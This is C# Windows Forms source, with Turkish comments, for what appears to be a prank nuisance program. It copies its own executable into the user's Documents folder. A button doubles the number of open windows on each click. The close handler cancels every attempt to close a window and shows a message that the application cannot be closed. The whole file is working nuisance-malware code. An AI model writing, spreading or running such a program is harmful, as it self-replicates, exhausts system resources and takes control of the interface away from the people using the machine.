using System;
using System.IO;
using System.Windows.Forms;

namespace youarespobit
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            // label1'in boyutlarını 100x100 olarak ayarlıyoruz
            label1.Width = 100;
            label1.Height = 100;

            // Uygulamanın kendisini kopyalamak için aşağıdaki metodu çağırıyoruz
            CopyAppToAnotherLocation();

            this.FormClosing += Form1_FormClosing;
        }

        private void label1_Click(object sender, EventArgs e)
        {
            // Burada herhangi bir işlem yapılabilir, şu an boş
        }

        // Uygulamanın kendisini belirtilen yere kopyalayan metod
        private void CopyAppToAnotherLocation()
        {
            try
            {
                // Uygulamanın bulunduğu dizini alıyoruz
                string sourcePath = Application.ExecutablePath;

                // Kullanıcı adını alıyoruz
                string userName = Environment.UserName;

                // Hedef dosya yolunu dinamik olarak belirliyoruz
                string targetPath = $@"C:\Users\{userName}\Documents\myapp_copy.exe";

                // Eğer hedef dosya zaten varsa, sileriz
                if (File.Exists(targetPath))
                {
                    File.Delete(targetPath);
                }

                // Uygulamayı belirtilen yere kopyalıyoruz
                File.Copy(sourcePath, targetPath);

                MessageBox.Show("Uygulama başarıyla kopyalandı.", "Başarılı", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Hata: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            CopyAppToAnotherLocation();

            // Mevcut pencere sayısını iki katına çıkarıyoruz
            int currentForms = Application.OpenForms.Count;
            for (int i = 0; i < currentForms; i++)
            {
                Form1 newForm = new Form1();
                newForm.Show();
            }
            
        }
        // Form kapatılmak istendiğinde çağrılan metod
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Kapatma işlemini iptal ediyoruz
            e.Cancel = true;

            MessageBox.Show("Bu uygulama kapatılamaz.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    }
}
